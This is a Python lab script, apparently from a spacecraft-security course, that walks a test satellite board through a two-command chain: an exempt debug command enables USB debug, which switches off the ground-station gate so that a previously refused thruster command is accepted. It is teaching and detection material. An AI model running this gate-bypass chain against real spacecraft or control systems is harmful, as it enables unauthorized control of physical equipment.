#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 09_gate_exemption_chain_usb.py -- walk through the command gate using a
# command the gate is built to let through.
#
# The gate refuses almost everything when ground-station mode is on. Almost:
#
#     worker.cpp, groundStationCommandAllowed():
#       if (apid == SPP_APID_TC_DEBUG_CONFIG || apid == SPP_APID_TC_GS_ACCESS) {
#           return true;                   // exempt, unconditionally
#       }
#       ...
#       if (gs_disable_request && source == COMMAND_SOURCE_USB &&
#           mission_ctx.usbDebugEnabled) {
#           return true;                   // and debug USB can switch it off
#       }
#
# Every step passes review on its own. The exemption is deliberate and
# documented: a spacecraft in trouble has to stay debuggable. The defect is
# what the steps compose into -- an exempt command sets the state that
# disables the gate, and the gate is what was protecting everything else.
#
# This is the first attack in the course that is a chain and not a single
# shot, and the lesson is that an exemption list is attack surface.
#
# Expected: the same command refused, then accepted, minutes apart, unchanged.

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat import (FlatSat, TC_DEBUG_CONFIG, TC_GS_MODE, TC_SET_THRUSTER,  # noqa: E402
                     TC_GET_STATUS)


def refused(fsat, packets) -> bool:
    """The board answers a refusal with an ERROR telemetry packet (APID 0x09)."""
    for p in packets:
        if p.apid == 0x09:
            return True
        body = fsat.plaintext(p)
        if b"GROUND" in body or b"REFUS" in body or b"DENIED" in body:
            return True
    return False


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=None)
    ap.add_argument("--thruster", type=int, default=1)
    ap.add_argument("--power", type=int, default=0x40)
    ap.add_argument("--restore", action="store_true",
                    help="put ground-station mode and debug back as they were")
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args()

    payload = bytes([args.thruster & 0xFF, args.power & 0xFF])

    with FlatSat(port=args.port, encrypt=True, verbose=not args.quiet) as fsat:
        print("\n=== 0. baseline: is the gate even on? ===")
        fsat.send(TC_GET_STATUS, b"", seq=1, listen=1.2)
        print("[*] If ground-station mode is off, the gate allows everything and "
              "this lab has nothing to show. Turn it on first.")

        print("\n=== 1. an ordinary command, with the gate up ===")
        first = fsat.send(TC_SET_THRUSTER, payload, seq=2, listen=1.5)
        was_refused = refused(fsat, first)
        print(f"[=] {'refused' if was_refused else 'ACCEPTED'} -- keep this result")

        print("\n=== 2. the exempt command. The gate never refuses this one ===")
        fsat.send(TC_DEBUG_CONFIG, b"\x01", seq=3, listen=1.5)
        time.sleep(0.3)

        print("\n=== 3. with debug on, the gate can be switched off from USB ===")
        fsat.send(TC_GS_MODE, b"\x00", seq=4, listen=1.5)
        time.sleep(0.3)

        print("\n=== 4. the same command as step 1, unchanged ===")
        second = fsat.send(TC_SET_THRUSTER, payload, seq=5, listen=1.5)
        now_refused = refused(fsat, second)
        print(f"[=] {'refused' if now_refused else 'ACCEPTED'}")

        print()
        if was_refused and not now_refused:
            print("[+] refused, then accepted. Two commands changed that, and "
                  "neither of them was the one you wanted to send.")
        else:
            print("[?] no clean before/after. Most likely ground-station mode was "
                  "already off at step 1, so there was no gate to walk through.")

        if args.restore:
            print("\n=== 5. putting it back ===")
            fsat.send(TC_GS_MODE, b"\x01", seq=6, listen=1.0)
            fsat.send(TC_DEBUG_CONFIG, b"\x00", seq=7, listen=1.0)

    print("\nWhat the sensor should have shown: an exempt command, then the gate "
          "going down.\nEither alone is routine. The pair is the finding.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
